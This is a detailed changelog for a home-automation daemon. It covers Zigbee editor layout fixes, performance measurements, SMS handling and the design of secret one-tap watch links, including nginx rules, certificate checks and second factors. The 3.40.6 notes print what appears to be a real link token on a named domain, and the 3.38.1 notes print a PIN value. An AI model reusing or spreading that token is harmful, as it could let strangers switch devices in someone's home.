`test/render.js` renames a section in **four** editors and refuses a release
where a single row stays behind.

3.49.1 — the Zigbee gateways header, and this time the whole of the reason
rather than a guess at it.

Three things were wrong at once. A rule indenting the header sixteen pixels
had survived an earlier removal, with a comment above it asserting the
opposite of what measuring shows. A gateway from `config.json` cannot be
dragged and took no indent, while one made on the page can and took
sixteen — so the rows disagreed **with each other**, and no single header
position could sit over all of them. And the pass that places headers ran
before the gateway packs and their handles existed.

Every pack keeps the room for a handle now whether it has one or not, so a
config gateway and a page gateway share a column. The header no longer
guesses its inset from a rule: it **measures where its own rows start**,
through folds, packs and handles alike, and takes the same. That pass runs
after the gateways are drawn and after every tick, so nothing drawn late is
missed.

    gateway 0 (config)  boxes 16px, names 16px   lines up
    gateway 1 (page)    boxes 16px, names 16px   lines up

`test/render.js` plants a gateway when none is configured — a check that
says nothing when there are none is how this was wrong three times —
measures **every** row against the header rather than the first, and takes
the gateway away again.

3.49.0 — a pass for slowness, and two things in the status were doing work
they had no need to do.

**`ssh_available()` was walking the whole of PATH on every status** — which
is several times a second with a page open, and the answer cannot change
while the daemon runs. Asked once now.

**A device as the API describes it was being built afresh for every
request.** Sixty-four devices, several requests a second, and the answer
only changes when the device speaks. It is worked out once per report now,
and a new reading still goes straight through — `test/replay.py` records one
and insists on seeing it in the very next status, because a cache that goes
stale here would be worse than the cost it saves.

    status()   2.81 ms  ->  1.51 ms

Measured either side: at rest the wake is **1.5 ms**; over two and a half
minutes of steady traffic the median moved by **0.18 ms**, which is no
drift. Under seventy seconds of storm with four page loops and a save every
second and a half, a report reaches the page in **4.9 ms** and the worst any
page waited was 170 ms.

The column-header check found one more while I was there: it was calling a
plain caption above a list a column header. Only a header drawn as a row of
its own table is one.

3.48.3 — a pass over the whole of it looking for faults. Most of what I
checked was sound, and saying so is part of the answer:

- **Ninety-one paths change something, and every one asks for the PIN.**
  Checked by reading the handler rather than by trusting it.
- No mutable defaults, no `except: pass` swallowing a mistake whole, no
  attribute read that is never set, no setting nothing reads, no function
  defined twice.
- **Losing the broker and getting it back**: noticed within seconds,
  reconnected immediately, and reports flowing again at 1.6 ms.
- The database passes its own integrity check with two million readings in
  it; seventy-five seconds of storm with four page loops and a save every
  second and a half left nothing lost and the same memory at the end.

One real wart found and fixed: a scene's **`actions`** meant the steps
themselves in the editor and how many there are in the status - the same
word for two shapes. Handing the status back to the editor is refused, so
nothing was ever lost, but the refusal was the only thing standing in the
way. The status now also says **`action_count`**, which can only mean one
thing, and `test/roundtrip.py` insists on it.

3.48.2 — you were right and I had talked myself out of it. A column header
stands above the section cards while the boxes it names sit **inside** them,
and a fold insets everything it holds by ten pixels. My check discounted
that inset as “the fold rather than a misalignment”, which is a tidy
sentence and wrong: the eye sees the names ten pixels left of the boxes.

A header now takes the fold's inset **when its own rows are in a fold** and
none when they are not, judged per editor by where the rows actually ended
up. Some of these editors fold their rows and some do not, and two of them
fold by a different route than the rest, which is why hanging this on the
folding code itself left one out.

    gw       header 16px  box 16px  (flat)    lines up
    person   header 16px  box 16px  (flat)    lines up
    bind     header 26px  box 26px  (folded)  lines up
    ptrig    header 26px  box 26px  (folded)  lines up
    smscmd   header 26px  box 26px  (folded)  lines up
    tap      header 26px  box 26px  (folded)  lines up

`test/render.js` walks every section so every card is drawn, then measures
the real distance from the card to the first name and to the first box,
through however many wrappers there are, and refuses a release where they
differ. Six headers measured, none of them excused.

3.48.1 — twenty-four more turns of phrase, **forty-three** in all.

The shape of the words: **sentence**, **ascii** (also **plain**),
**oneline**, **nospace**, **slug**, **short**, **len**, **sms**, **url**.
The make-up of a list: **reverse**, **unique**, **commas**, **spaces**,
**quotes**, **tags**. Numbers: **round2**, **abs**, **plus**, **percent**,
**thousands**, **degrees**. And for a reading that is really a yes or a no:
**yesno**, **onoff**.

**`.ascii` pays for itself.** One accented letter anywhere in a text message
turns the whole of it into the wider encoding, where seventy characters fill
a part instead of a hundred and sixty. A Czech status reply of a hundred and
sixteen characters is two messages; the same words plainly spelled are one.
And **`.sms`** says how many a message will be before it is sent.

All forty-three were put through the whole chain on live data, and
`test/facts.py` hands every one of them an empty string, a word, a list, a
negative number, something that is not a number at all and a Czech word, and
refuses a release where any of them falls over or gives back something that
is not text. The page and the daemon must know exactly the same list.

3.48.0 also brings **turns of phrase**. A fact is a string, and most of the
ones worth writing about are lists with commas between them, which is rarely
what one wants in a message. Put a dot and a word after any fact:

    Doma jsou: {people_home}
    ON Plugs: {plugs_on_list.nl}
    ON Lights: {lights_on_list.nl}

Nineteen of them: **nl**, **lines**, **bullets**, **dashes**, **numbered**,
**count**, **first**, **last**, **sort**, **and**, **or**, **three** (the
first three and how many more), **upper**, **lower**, **title**, **round**,
**round1**, **trim**, **quiet** (nothing at all when there is nothing to
say). They chain: `{plugs_on_list.sort.bullets}`.

They work **everywhere a fact works** - an alert, a reply by text, a link
that tells you something - because they are done where facts are put into
words rather than in any one of those places. An empty list is a word in
this house rather than an empty string, so *nothing* and *nobody* count as
none rather than as one thing. The completer offers them after a dot and
tells a turn from a device reading by what stands before it, so `{AP.` still
offers the AP's readings.

3.48.0 — three faults around the gateway's inbox, and they were feeding each
other.

**Forget all did not stick.** Clearing the history left the daemon's own
note of which messages it had seen, and the next read of the device wrote
every one of them straight back in - on the reasoning that a message on the
device and missing from the log must be a gap worth filling. A deliberate
throwing-away is not a gap. What is forgotten is now remembered as
forgotten, and survives a restart.

**Only messages read for the first time were taken off the device.** One
whose delete failed once stayed there for good, offered again on every read
for as long as the gateway lived. Anything already dealt with and still
sitting there is taken off now.

**A failed delete said nothing.** It went to the debug trace, where nobody
looks until messages stop arriving - and they do stop, because a full inbox
turns new ones away. It is written in the events now, saying what it means:
*the gateway would not let go of 2 message(s) - its inbox fills up and new
ones stop arriving*.

3.47.1 — the preview said one thing and the address did another, and the
reason is worse than a crossed wire: **the change had not been saved**. The
preview reads the row as it stands on the screen, the link does what was
last written down, and nothing said which was which — so a preview that
looked authoritative was quietly describing a link that did not exist yet.

The daemon was never confused: four links with four reports were checked and
each address answered with its own. The fault was entirely in not saying so.

With changes pending the preview now reads **once saved, the watch would
say**, in the warning colour, and the setup button refuses to hand out an
address at all: *Save the links first — this one still does what it did
before*. An address copied onto a watch is copied once, and it should not be
the wrong one.

`test/render.js` leaves a change unsaved and refuses a release where either
place keeps quiet about it.

3.47.0 — **replies marked failed that had arrived perfectly well.** The
gateway sends one message at a time; three questions in a row leave the
second and third waiting past our fifteen seconds while the replies
themselves go out, arriving together half a minute later. Any exception was
being written down as *could not send*, and a message that arrives recorded
as one that did not is worse than no record at all.

A gateway that does not answer in time has not refused. That is now its own
state — neither sent nor failed — and it reads *no answer from the gateway*
in amber rather than *failed* in red, with the note that it usually means the
message went out anyway. A reply is never sent again on a timeout, since
arriving twice is worse than arriving late.

And zigmon no longer asks the gateway two things at once: messages go one at
a time with a breath between them, **sms_send_gap_s**, a second and a half by
default. That is what made the later ones look failed in the first place.

The **Zigbee gateways header** is right at last, and I had it right the first
time: the indent belongs to the pack, always. I took it out again after
measuring a card with no gateways configured — no gateways, no pack, no
indent, and a measurement that proved the opposite of the truth. The check
now says out loud when it cannot measure something rather than passing
quietly.

3.46.4 — *too many tries* from a link that was working perfectly: the guard
against somebody guessing at addresses was counting **every** use, not the
wrong ones. Ten presses in a minute — what somebody standing in a doorway
does, or a watch asked twice what the house is doing — locked the address
out for a minute, and the answer read as though the link were broken. Only
wrong guesses count now: pressed fifteen times in a row it answers fifteen
times, and a guesser is still stopped at eleven.

**The Zigbee gateways header**, third time, and this time measured rather
than reasoned about. I had indented it to match an indent for a drag handle
that those rows never take — not at rest and not while arranging, both
checked. So the header sat sixteen pixels in and the boxes were flush left.
It takes none now.

`test/render.js` adds up the real distance from the list to the first box,
through however many wrappers there are, instead of guessing which one
carries the indent — which is what got this wrong twice. A fold's own inset
is discounted, since that is the fold and not a misalignment.

3.46.3 — no more *choose it first*. A new link comes up ready to use —
**tell me something** and **How the house is** — which is a pair that makes
sense and can be saved as it stands. What was wrong before was never that it
came filled in; it was that the two halves disagreed, offering a socket's
toggle for a question it had been asked.

The two lists agree in both directions now: point a link at a light and the
actions become toggle, on and off; point it back at telling and they become
the reports. `test/render.js` presses Add and refuses a release where the
action a new link holds is not one of the actions it offers.

3.46.2 — a new link came up already filled in with a pair that cannot be:
*tell me something* and *toggle*. Nothing had chosen them — the model was
empty and the list simply showed whatever was first in it, which since the
last version was telling. A new row now starts at **— choose what it acts
on —** with the actions waiting on that choice, and picking one fills the
other from the top of its own list.

And **asking the house something belongs to the links alone**. It had gone
into the target list every editor shares, so a rule or a scene could be
pointed at it, which means nothing at all. It is added where it is used and
nowhere else.

`test/render.js` presses Add and refuses a release where the new row comes
up with a choice nobody made, or where telling is offered in the bindings,
the rules or the scenes.

3.46.1 — three finishing touches, and the middle one was a trap worth
knowing about.

**Tell me something has a section of its own**, *Ask it something*, at the
head of the list rather than sitting among the sockets it has nothing to do
with.

**The symbol and fact pickers were on screen whatever the script said.**
They were being hidden correctly, and shown anyway: `display:flex` on their
row beats the hidden attribute, so hiding did nothing at all. The same trap
had the desk and the preview. Now they carry a rule that wins.

**The preview belongs to a telling link only.** A switch has nothing to
preview: what it would say has not happened yet.

`test/render.js` measures what is actually drawn rather than what the script
believes — which is the only way this class of fault is ever caught — and
waits for the answer rather than the element, since an empty preview is
hidden by a rule of its own.

3.46.0 — you were right, and it was the root of the rest. **Telling belongs in
the target, and the reports are its actions** — not a third list of its own
competing with the other two.

    WHAT IT ACTS ON            WHAT IT DOES
    tell me something          How the house is / Who is home / The weather
    Light-Loznice-Main         toggle / switch on / switch off

One list decides the other, which is how every other editor here works, and
the trouble of the last few versions came from having two that both claimed
to. The extra list is gone.

Links saved by the versions in between are carried across as they load: a
report kept in a field of its own becomes a target of *tell* with that report
as its action. Nothing needs re-doing.

3.45.5 — you found it exactly: a link made just now behaved, a link that was
already there did not. The difference is that a new one leaves the editor
*unsaved* from the moment it is added, and an unsaved editor is not redrawn.

A redraw replaces the rows with fresh copies read from the state, and every
control in a row was holding on to the object it had been built with. After
the first redraw those objects were no longer the ones being saved, so
editing an existing link wrote into something already thrown away — the
preview stayed as it was, and Save wrote back what had been there before.
Each control now looks its row up by id at the moment of the event.

A switching link also never asked for its preview at all, which is why that
row showed an empty one until something else made it redraw.

`test/render.js` edits a link that was already there, through the controls
rather than by setting the model, and refuses a release where the change does
not take.

3.45.4 — **every link shows what it would answer with**, not only the ones
that talk. A switching link previews the sentence it will send back when
pressed — *Light-Loznice-Main is now off* — worked out without touching
anything, so the row reads the same whatever kind of link it is:

    tell / own      text shown   pickers shown   Doma 22.6, venku 13.3.
    tell / house    text hidden  pickers hidden  22.6° inside, 13.3° out. No lights on.
    toggle          text hidden  pickers hidden  Light-Loznice-Main is now off

The symbol and fact pickers belong to a sentence of your own and appear
nowhere else — that was already so in 3.45.3, which you may not have had yet.
`test/render.js` now insists on both: a preview on every kind of link, and
the pickers only where they belong.

3.45.3 — the writing desk is a line of its own underneath rather than a column
squeezed into the row. The name, what it acts on and what it does stay where
they are, on one line with the headings above them, whatever the link is
doing — a switch, a prepared report, or a sentence of your own. The text box
and its two buttons come and go **together**, as one thing; the preview
stays for a prepared report, since that is worth seeing too.

It is the same shape an SMS command's reply uses: a second line spanning the
whole row. `test/render.js` puts a link through all three states and refuses
a release where the row changes shape or where the box and its buttons part
company.

3.45.2 — four things, and the first was my fault twice over.

**Nothing could be saved.** A row just added and not yet filled in refused
the whole list — and after pressing *Add a link* there is always one, so from
that moment on nothing would save at all. An unfinished row is an unfinished
thought and is passed over now. A half-filled one — named but with nothing
chosen — still refuses, and says **which row**, which the old message did
not.

**The box for your own sentence was two lines**; it is four, taller, and can
be dragged taller still. A sentence worth reading out is longer than a line.

**Every report previews now**, not only one of your own: a prepared one is
worth seeing before it goes on a watch too. *the watch would say → 22.6°
inside, 13.3° out. No lights on. Nobody is home.*

**The Zigbee gateways header** sat left of its columns. The gateways are
dragged a pack at a time, so the indent that makes room for the handle is on
the pack rather than on a row — which is also why the check I added last time
missed it, and then failed on the fix. The check compares the header against
whatever actually carries the indent now, and catches both shapes.

3.45.1 — a link telling something of your own gets the writing desk an alert
has, rather than the bare box it had: a **symbol picker**, a **fact picker**
listing all 139 with an example of what each would say right now, the
**completer** on `{` or Ctrl+Space, and a **preview underneath** that reads
back what the watch would say as you type it.

    Inside {inside_c} and outside {outside_c}.
    the watch would say → Inside 21.7 and outside 13.3.

It is a text area rather than a line now, since a sentence worth reading out
is longer than a line. `test/render.js` checks the desk is there, both
pickers are on it, and the preview says something with a figure in it.

3.45.0 — **a link that only tells you something.** Everything else here
switches, and switching is not what one wants most of the time from a wrist
in the dark.

Nine prepared reports, each a sentence rather than a table, because a watch
reads a sentence out in one breath and a table on that screen is no use to
anybody:

    how the house is     21.7° inside, 13.3° out. 3 lights on, 5 sockets. Nobody is home.
    who is home          Nobody is home. Falco is out.
    anything wrong       1 sensor may have lost its configuration.
    what it costs        This month 34.29 kWh, 223 Kč. On this pace 410 Kč by the end.
                         The thirstiest is Plug-UPS.
    what it is drawing   185 W right now: 185 W of sockets and 0 W of lights.
    what is open         Everything is shut
    the weather          light rain, 13.3° and feels like 12.6°. Today between 12.1° and 14.7°.
    the heating          Every room is at its setting
    what has gone quiet  AP, Button-Topeni and three others have not spoken for hours

Or **a sentence of your own**, written from any of the 139 facts.

A missing figure closes its own clause rather than leaving *peaked at  W* to
be read aloud, which is the sort of thing that only shows up when something
speaks. `test/replay.py` walks all nine and refuses a release where one of
them leaves a gap, an unfilled fact, or switches anything at all.

`zigmon --tell house` reads one out here, without a watch to hold.

3.44.0 — a pass over the whole of it, and the most useful thing it found was
that the two column-header faults fixed for the one-tap links **were in four
other editors as well**. I had been mending them one at a time without seeing
they were the same two:

- a row carries the indent that makes room for its drag handle and a header
  does not, so every column name sat one notch to the left of what it names —
  bindings, people, presence triggers and SMS commands all did this;
- a header that inherits its row's rounded corners lifts the ends of its
  underline off the line — four of them again.

Said once now rather than five times apart, and `test/render.js` measures
every header against the rows it names: seven checked, all lined up. That is
the check that would have caught the first one.

**139 facts**, up from 131: the one-tap links (how many, how many are on, how
many were used today), the peak this hour and this week, how many sockets and
lights are on, and how long the alerts stay hushed. Writing a message still
costs 1.7 ms.

**Every flag is findable.** Fifty-eight of them, each with help text, and the
ones no word command replaces now appear in the worded help too —
`--presence`, `--monthly` and `--reset-order` were reachable only by reading
argparse's own list. `test/version.py` refuses a release where a flag can be
found no other way.

Under seventy-odd seconds of storm with four page loops and a save every
second and a half: **3.8, 4.0, 3.8 ms** across three windows, no drift, worst
page wait 138 ms, nothing lost.

3.43.0 — a pass for faults and for slowness. The message path was never the
trouble; **the pages were**, and only under load, which is why it had not
shown up before. Measuring each page separately rather than the whole made it
plain at once.

**The battery figures took 2.7 seconds.** They walk a month of history for
every cell, the answer is kept for five minutes, and whoever asked in the
moment it expired paid for the walk — during a busy spell, on a 315 MB
database, that is seconds of nothing. Now a stale answer goes back at once
and the work happens on a thread of its own, once however many ask. **96 ms**.

**The energy summary took 2.3 seconds** for the same reason, and then went on
doing it after I had supposedly fixed it — because my refresh emptied the
cache before recounting, so anyone asking during the recount found nothing
and counted it themselves. The old answer stays until the new one is ready.
**5 ms, worst of 159 calls under a storm.**

**And the first call after a restart paid for everything**, whoever happened
to make it: 514 ms. The daemon warms those figures itself a few seconds after
it comes up. **26 ms.**

What it reads now, through seventy-five seconds of storm, four page loops and
a save every second and a half: a report reaches the page in **4.3, 4.5, 4.7
ms** across three windows — no drift — and the worst any page waited was 177
ms. Nothing lost, nothing refused, thirteen threads and the same memory at
the end. `test/replay.py` refuses a release where a caller is made to wait
for the battery figures or where forty callers start forty refreshes.

3.42.3 — a link on a scene answered *is unknown*, because the state was read
from sockets and a scene is not a socket.

A scene is not one thing either, so it has no single state; what somebody
means by *is it on* is whether the house is as that scene leaves it. Where
every step says plainly on or off, that can be answered — **set** or **not
set**. Where the steps toggle, it cannot be honestly, so the sockets the
scene touches are counted instead: *all off*, *2 of 4 on*.

    scene TVLoznice-All-OFF is set
    scene TVLoznice-All-ON is not set
    scene Workshop-PC-TV is all off        (its steps toggle)

3.42.2 — `?ask` switched the thing it was asked about, which is the opposite
of what it is for. It was thrown away twice on the way in, and both are the
kind of loss that leaves no trace.

An nginx rewrite whose replacement contains a `?` discards the original query
string, so `/tap/TOKEN?ask` arrived at the dashboard as a plain press. The
rewrite keeps it now. And the dashboard rebuilt the path for the daemon
without it, so even a surviving `?ask` would have been dropped at the second
hop. It carries it through.

Tried the whole way through the dashboard: *is off* when asked, *is now off*
when pressed. `test/endpoints.py` refuses a release where a rewrite throws
the query away or the relay leaves `?ask` behind — both faults put back and
both caught.

3.42.1 — what 3.42.0 was supposed to do. The explanation of the state, the
`?ask` address and what a watch icon can and cannot be made to do went into
the **phone setup** dialog rather than the link one: I anchored the insertion
on a line that appears in both, and it found the first.

It is in the link's own dialog now, between the watch steps and Android, and
its `?ask` address is a snippet like the others — click to copy, hover for a
QR code. Three addresses in that dialog, each with its own QR: the tidy one,
the plain one for a web server without the rule, and the one that only asks.

3.42.0 — a link now answers with the state it left things in:

    {"ok": true, "state": "on", "message": "Lampa is now on"}

Put **Show Result** after *Get Contents of URL* in the shortcut and the watch
says *Lampa is now on* as you tap it. For several things at once it says
*3 of 8 on*. And **`?ask`** on the end of the address reports how things
stand and touches nothing — a second shortcut that only tells you. Both
`?ask` and `?ask=1` work, since a valueless one is what somebody types.

The icon itself cannot change colour: a shortcut's icon is fixed when it is
made and watchOS gives no way to paint it from an answer. For a tile that
shows on and off in colour the way the Home app does, the devices have to be
in HomeKit, through Homebridge or a Matter bridge — a different road from
this one, and the dialog says so rather than leaving it to be discovered.

3.41.0 — a certificate from a public authority can still be refused by a
watch, and the likeliest reason looks nothing like itself: the certificate is
good and the **middle certificate linking it to its authority is not being
sent with it**. Safari fetches that piece by itself and says nothing, which
is why the phone is content; a watch does not fetch it and refuses. nginx
sends `ssl_certificate` verbatim, so the file has to hold the whole chain —
`fullchain.pem` with certbot, never `cert.pem`.

`zigmon --taps-test` now tells the four apart instead of saying one thing to
all of them: a missing middle certificate, a certificate for another name, an
expired one, and one from an authority nothing trusts. Each says what to do,
and the missing-middle one gives the command that settles it in a word:

    grep -c "BEGIN CERTIFICATE" /etc/nginx/certs/server.pem

One means the middle is missing. Tried against a real three-certificate chain
served both ways round.

3.40.9 — `/tap/…` answered *no link given*, and the token was in the address
all along. The location captured it correctly and then the rewrite threw it
away: a rewrite resets `$1`…`$9` to the captures of **its own** expression,
and `rewrite ^` captures nothing, so `$1` was empty by the time it was used.
The rewrite makes the capture itself now.

The refusal also said the same six words whatever had gone wrong. An empty
token and a malformed one are different faults with different fixes, so they
say different things — an empty one names the rewrite, which is where it went.

`test/nginx.py` gained the rule: a rewrite that uses a capture must make one.
Put the old line back and it says so.

3.40.8 — the nginx file I shipped would not start, and stopping somebody's web
server is worse than any fault inside the dashboard.

    nginx: [emerg] pcre_compile() failed: missing ) in "^/tap/([A-Za-z0-9_-]"

The pattern was sound; nginx never saw all of it. A brace begins a block in
an nginx file, so `{8,64}` in an unquoted location pattern cuts the
expression off at the brace. Quoted, it is read whole. The other line,
`duplicate MIME type "text/html"`, was `text/html` named in `gzip_types`
where nginx compresses it anyway.

**`test/nginx.py`** now reads that file for what nginx would refuse: a brace
in an unquoted pattern, text/html in gzip_types, unbalanced braces, a pattern
that is not a regular expression. Checked against both of today's faults —
put either back and it fails, quoting the same thing nginx did.

3.40.7 — a link that works on the phone and is refused on the watch is almost
always the certificate, and `zigmon --taps-test` now says so before it says
anything else:

    The certificate is not one every device trusts: self-signed certificate
    An iPhone can be given a private authority in a configuration profile and
    will then be happy; an Apple Watch has no practical way to be given one.

The phone trusts a private authority because a profile put it there. The
watch has no such profile and no straightforward way to be given one, so it
refuses. A certificate from a public authority is the way out and costs
nothing. The check looks for the verification failure inside the error rather
than catching its class, since urllib hands it over wrapped and the plain
form never arrives.

3.40.6 — a one-tap link has an address with nothing in it for a phone to
correct:

    https://mqtt.falco81.net/tap/jQbMRw78yqhUWH-GlVdNR_hmENQ6Cx97

No full stop, no equals sign, no ampersand — the three things a phone
keyboard turned into hyphens. It needs one line in nginx, which the shipped
configuration now carries:

    location ~ ^/tap/([A-Za-z0-9_-]{8,64})$ { rewrite ^ /index.php?t=$1 last; }

Where the dashboard is not at `/index.php`, or the rule is not there, the
dialog shows `?t=TOKEN` instead and says which line to add. Both shapes work
and so does the original.

3.40.5 — the nginx log said it plainly:

    GET /index-php?api-tap&t=w6ZR1yJ5… 404

The full stop in `index.php` and the equals sign in `api=tap` had both become
hyphens before the request was ever made — a phone's autocorrect on an
address typed or dictated by hand. Nothing in the daemon ever saw it.

So there is less to get wrong now. A link's address is **`?t=TOKEN`** — one
equals sign and nothing else; the old `?api=tap&t=` still works for anything
already set up. And the dialog says what the log said: scan the QR code
rather than typing it, because a phone will change a full stop into a hyphen
and the address then goes nowhere.

3.40.4 — **`zigmon --taps-test`**, for when a link does not work from the
phone. It opens each one exactly as a watch would and says what came back,
because *it does not work* has half a dozen causes that look identical from
the wrist:

    Lampa u postele
      it worked   {"ok": true, "message": "toggle Light-Loznice-Main"}

A page of HTML instead of an answer means something in front of the dashboard
is asking to log in, or the address is not the dashboard at all. **404** means
the address was replaced or the link withdrawn since it was copied — pressing
*Make a new address* in the dialog does that, so a shortcut made before it
stops that moment. **403** is a login in front of the dashboard, or
*public_view* switched off. A refused connection means the dashboard is not
reachable from here, which is what a watch on mobile data will find too.
Addresses still saying `your-dashboard` are called out before anything is
tried.

3.40.3 — the headings were one column to the left of what they named. I had
given the grid a column for the drag handle, and the handle is positioned
over the row rather than taking a cell — `.hasgrab` has done that all along
and does it for every other editor too. Six columns now, six headings, and
the header indented by the same sixteen pixels the handle claims, so *What it
is for* sits over the box it names.

The name box was also the widest thing in the row for no reason; it shares a
width with what it acts on now.

3.40.2 — the column names sit once above the sections now, as they do in every
other table here, instead of once over every box in every row. The row is a
grid of seven columns matching the seven headings rather than a line of
labelled fields, and the header is hoisted above the folds the same way the
bindings and presence headers are — by the same line of code, with `tap-head`
added to it. On a narrow screen the header goes away and the row wraps, which
is what the others do too.

3.40.1 — a one-tap link row now offers everything a sensor rule does. Two
things were missing and they had the same cause in the end.

The **Add here** button in a section head comes from a table that maps an
editor to its own Add button, and links were not in it. One line.

The **right-click menu** offered only *move to section*, not *add one above*,
*add one below*, *copy above*, *copy below*. The menu finds the row's place
in the list by identity, and an editor that rebuilds its rows from the state
on every paint hands the row a model that is only an equal copy of the one in
the list — so it was never found and those four were left out. It falls back
to matching by id now, which mends it for links and for anything else that
rebuilds the same way.

3.40.0 — one-tap links get the same handling every other editor has: a
**switch at the head of each row**, **sections** that fold and can be renamed
and dragged, and a **grip to reorder** the rows. None of it is new code — the
sectioning and the row dragging are the ones the messages, presence triggers
and devices editors already use, so they behave the same way and remember
what is folded the same way.

Switched off keeps the link and its address and refuses to act: the address
answers *that link is switched off*, the attempt is written down, and the row
dims. It is the way to take something off a watch for a week without
unpicking the shortcut and making a new address afterwards.

3.39.4 — the setup dialog said *toggle scene:f8f2a1bb*, which is no sort of
answer. The page had one way of putting a target into words and it only knew
the Zigbee and heating half of them; a scene, a socket or *all lights* fell
through and printed its own id. It looks in the full list now, so the dialog
says **toggle Workshop-PC-TV**.

And **Make a new address** at the foot, as People has it. A link seen by the
wrong person is replaced rather than withdrawn: the same one thing, a fresh
secret, and the old address dead the moment the new one is made. It takes the
PIN and is written in the events. `test/replay.py` rolls one and checks the
old address has stopped and the new one works.

3.39.3 — the box in a one-tap link row looked wrong because the look belongs
to the messages card and to nothing else: `.msg-card input` is where the
font, the border, the corners and the padding are set, so putting the same
labelled field anywhere else got a browser's plain grey box with a label over
it. That was the whole of what 3.39.1 changed, which is why it looked
unchanged. The rule covers a link row too now, so the two boxes are the same
box.

The **setup button** — the one with the steps and the QR code — arrived in
3.39.2, so it is missing on anything older. `zigmon --version` says which is
running.

3.39.2 — each one-tap link has a button that shows how to use it, in the same
dialog the phone setup uses: numbered steps, the address as a snippet you
click to copy and **hover to get a QR code** for scanning with the phone.

The steps are for the thing in front of you — Shortcuts, *Get Contents of
URL*, name it, then <b>Show on Apple Watch</b> and put it on a watch face as
a complication — and every mention of what the link does says what this link
does, not a general form of words. Android and being away from home get a
line each.

The address is not in the page's own data: the dialog asks for it with the
PIN, the way the phone setup asks for a person's token, and every showing is
written in the events. Without the PIN it says so; with the wrong one it says
so; for a link that has been withdrawn there is nothing to show.

3.39.1 — the one-tap links card looks like the rest of the page now. Both
buttons carry their icons, as every other Add and Save does, and each control
in a row sits in a labelled field — *what it is for*, *what it acts on*,
*what it does*, *used* — rather than a bare box in a line, which reads as
something half-finished. Changing what a link acts on refills what it can do
to it, so a link pointed at a light no longer offers what only a socket can.

3.39.0 — **one-tap links**, so a watch can switch things.

A watch cannot speak to this daemon, but it can open a web address, and that
is enough. Each link does **one named thing and nothing else**, carries a
secret of its own, can be withdrawn on its own, and is written down every
time it is used. That is what makes it safe to keep on a wrist that may be
lost: whoever finds it can switch that one lamp, and nothing more — no PIN,
no API token, and no way to reach anything else.

Control → Automation → **One-tap links**: a name, a thing to act on, and what
to do to it. `zigmon --taps` lists them with how often each has been used;
`zigmon --taps --secret` gives the addresses, which take the PIN like any
other secret. The token never leaves with the ordinary state, so it is not in
the page's own data either.

On an Apple Watch: Shortcuts, a new shortcut, *Get contents of URL*, paste
the address. It runs on the watch itself over WiFi or cellular, so it works
away from home as well — which is the whole point of the cellular one. Set
**Where the dashboard answers from outside** in Settings first, or the
address will say `your-dashboard`.

A wrong link costs a second and ten tries a minute from one address.
`test/replay.py` makes a link, opens it, checks it acted on the right thing
and said a link did it, tries a made-up one, withdraws the real one and
checks it has stopped working.

### By a header instead of by its address

The secret in a link's address is 192 bits, so nobody guesses it. What happens
to it is that it is written down: the web server's log keeps it, any proxy on
the way keeps it, the browser's history keeps it, and the robot that fetches a
link preview when an address is pasted into a message *follows* it — pasting
the address into a chat presses the link. Settings → **One-tap links** moves
the same secret into a header of a POST, where none of those can see it:

    POST https://home.example.net/tap
    X-Zigmon-Tap: <the link's secret>
    X-Zigmon-Code: 123456          (only when a code is asked for)

The switch has three positions. *By its address* is how it has always been.
*Either way* accepts both, which is how one moves across without the house
going dark while the shortcuts are rewritten — each link shows which road it
was opened by last time, in amber while it is still on the old one. *By a
header only* refuses the old addresses; every use of one after that is written
in **Events**, while the answer given out is word for word the one an address
that does not exist gets. Nothing is thrown away by any of it: switching back
brings the old addresses straight back.

What it costs: there is no address left that can simply be opened, so a
bookmark or a watch-face complication that only opens a URL will not do — it
has to be a shortcut. On a watch that is no loss; Shortcuts runs there.

**And a second factor.** With *ask for a second factor* switched on, a header
link is not enough on its own. Which factor is a second choice.

*Duo* pushes the question to the Duo app, which has a watch app of its own, so
a press made on the wrist is approved on the wrist. Install `duo-client`
(`pip3 install duo-client`) and the daemon talks to Duo through Duo's own
package; without it, it signs the requests itself. *Test Duo* fetches the
account's devices, and the card offers them as a list — an account with
several enrolled should not be left to Duo's own idea of which one to ring.

The shortcut sends its one header as usual and is answered when the push is
approved, with what was done — one action, no ticket and no second request.
The daemon does the asking and the waiting, so the press happens whether or
not the watch is still listening; a shortcut that would rather not wait sends
`{"wait": false}` and comes back for the outcome with `X-Zigmon-Wait`. Its hostname, keys and username go in Settings → One-tap links, and
*Test Duo* checks them without pushing anything.

*A code* is the older way: a header link must also carry one from a phone — ordinary TOTP, so 2FAS, OTP Auth and Raivo all
carry it, and each has a Shortcuts action that hands the current code back.
The secret belongs to a **phone** rather than to a link, so ten links are one
entry in the authenticator and a lost phone is one thing to take away. A code
is taken while its own thirty seconds are open and refused for ever after:
the second press in a doorway works, and a secret read out of a log next week
is worth nothing. Asking for a code with no phone set up is refused, because
it would shut the links to everybody including whoever asked.

The magnifier beside a link writes the recipe for whichever road is open.
Hovering the address, the header's secret or the authenticator's secret draws
a QR code for it, so nothing has to be typed into a phone. They all look the
same: a value that can be carried away is one kind of thing. Either secret can
be replaced on its own — a new address for the link, a new secret for the
phone — without touching anything else.

Opening that address in a browser answers `405` and says what it wants: a GET
is the one thing the header road exists to refuse.

3.38.3 — yes, both are left out, and now it is held to that. **All sockets**
and **all lights** skip a socket that is watched but not switched
(*monitor only*) and one that has been turned off in Devices.

They are skipped by two different means, though, which is why the question
was worth asking: monitor-only is filtered where the star is expanded, and a
disabled socket never enters the list the daemon drives at all. A change to
either could have quietly undone one of them without the other noticing.
`test/replay.py` now adds one of each and refuses a release where either star
reaches it.

3.38.2 — a row of the bindings table lights up the way every other row on the
page does: the same blue outline, the same weight, rather than a grey fill I
had invented for that one card. The outline is drawn just inside the row
rather than two pixels outside it, because a table row cannot take an outline
outwards without the cells drifting. A row that looks wrong keeps its amber
tint underneath, so the two say different things and do not fight.

3.38.1 — wrong again, and this time I had built the wrong thing rather than
built it badly. `--secret` means *this command's own output, with nothing
starred out*. It was appending a list underneath instead, which is a
different question and not one anybody asked.

    zigmon --diag                pin   "****"
    zigmon --diag --secret       pin   "5313"

Nothing is appended now, anywhere. `zigmon --secret` on its own still prints
the whole list, because that is where that question is asked.

Looking for what was starred out turned up a leak of my own making. `--diag`
hid three keys **by name** — the two MQTT passwords and the PIN — and printed
everything else in the configuration as it stood, so the SIM gateway
password, the Telegram token, the ntfy topic and the WiFi controller's key
went to the screen in full for anyone who ran it. Anything that looks like a
secret is hidden now, by shape rather than by a list somebody has to
remember to add to. `sms check` said *(kept)* where the password should be;
with `--secret` it says the password.

`test/version.py` checks all eight of them, both ways: hidden without the
switch, shown with it.

